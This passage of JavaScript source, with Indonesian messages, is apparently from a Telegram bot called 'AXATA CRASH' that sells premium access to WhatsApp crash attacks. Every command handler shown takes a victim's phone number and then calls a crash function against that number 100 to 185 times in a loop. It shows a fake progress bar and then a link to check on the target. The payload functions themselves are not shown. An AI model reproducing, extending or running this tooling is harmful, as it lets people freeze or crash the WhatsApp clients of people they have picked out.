❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 151; i++) {
            await NotifXaxata(target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AxataXPou (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 142; i++) {
            await AxataXPou(target);
            await sleep(2000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AdminAxata (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 134; i++) {
            await AdminAxata(target);
            await sleep(2000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS FREZZE ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/FeezeCrash (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await FeezeCrash(axata, target);
            await sleep(4000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AxataNewUi (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 185; i++) {
            await AxataNewUi(target, Ptcp = true);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/AxataMuda (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 135; i++) {
            await AxataMuda(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/LocationAxata (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤  ☇
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 142; i++) {
            await LocationAxata(axata, target);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/chatFrezze (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
